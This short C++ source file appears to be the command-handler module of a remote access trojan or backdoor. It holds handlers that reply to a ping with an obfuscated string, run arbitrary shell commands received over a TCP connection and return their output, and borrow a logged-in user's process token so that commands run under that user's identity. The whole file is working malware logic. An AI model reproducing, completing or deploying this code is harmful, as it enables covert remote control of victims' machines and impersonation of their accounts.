#include "commands.h"


void handle_ping_command(TCPClient client) {
    client.send_data(OBFUSCATE("pong"));
}

void handle_shell_command(TCPClient client) {
    auto data = client.receive();
    const auto output = exec(*data, nullptr);
    client.send_data(output.c_str());
}


void handle_shell_command_as_user(TCPClient client) {
    auto data = client.receive();
    AutoHandle token = get_token_of_user_process();
    if (token == INVALID_HANDLE_VALUE) {
        client.send_data("Can't find a matching process?");
        return;
    }
    const auto output = exec(*data, token);
    client.send_data(output.c_str());
}